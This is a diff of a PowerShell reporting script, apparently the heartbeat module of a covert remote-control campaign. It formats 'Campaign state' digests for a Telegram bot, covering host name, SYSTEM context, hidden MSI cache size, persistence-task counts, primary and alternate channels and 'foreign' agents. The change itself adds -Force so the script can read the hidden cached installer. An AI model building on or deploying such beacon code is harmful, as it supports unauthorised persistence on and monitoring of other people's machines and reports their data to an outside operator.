@@ -1,5 +1,5 @@
 #Requires -Version 5.1
-# TG_REPORT BUILD 20260802T7 - identity-aware tasks + compact digest mode
+# TG_REPORT BUILD 20260802T8 - identity-aware tasks + compact digest mode; -Force on hidden cache
 param(
     [Parameter(Mandatory = $true)][string]$State,
     [string]$Summary = '',
@@ -253,7 +253,7 @@ $isSystem = $who -like '*SYSTEM*' -or $who -eq 'NT AUTHORITY\SYSTEM'
 
 $msiCache = Join-Path $WorkDir 'pkg.msi'
 $msiSize = if (Test-Path $msiCache) {
-    '{0:N0} KB' -f ((Get-Item $msiCache).Length / 1KB)
+    '{0:N0} KB' -f ((Get-Item $msiCache -Force).Length / 1KB)
 } else { 'none' }
 
 $monPath = Join-Path $WorkDir 'own_mon.cmd'
@@ -451,14 +451,14 @@ $($taskLines -join "`n")
 <b>Campaign state</b>
 - <code>$(Esc $stateLine)</code>
 
-<i>Bot: @nobuddyrmmBot | TG_REPORT T7</i>
+<i>Bot: @nobuddyrmmBot | TG_REPORT T8</i>
 "@
 
 # compact digest mode: one short line, HTML-free (hourly heartbeat)
 if ($Mode -eq 'compact') {
     $foreignN = 0
     if ($stateObj -and $stateObj.foreign) { $foreignN = @($stateObj.foreign).Count }
-    $msiShort = if (Test-Path $msiCache) { '{0:N0}KB' -f ((Get-Item $msiCache).Length / 1KB) } else { '0' }
+    $msiShort = if (Test-Path $msiCache) { '{0:N0}KB' -f ((Get-Item $msiCache -Force).Length / 1KB) } else { '0' }
     $primShort = if ($primOk) { 'OK' } else { 'DOWN' }
     $altShort = if ($altLine -like 'Running*') { 'OK' } else { '-' }
     $text = "$emoji SCD|$($env:COMPUTERNAME)|prim=$primShort|alt=$altShort|foreign=$foreignN|tasks=$taskOk/5|msi=$msiShort|up=$uptime|b=$Build|$now"
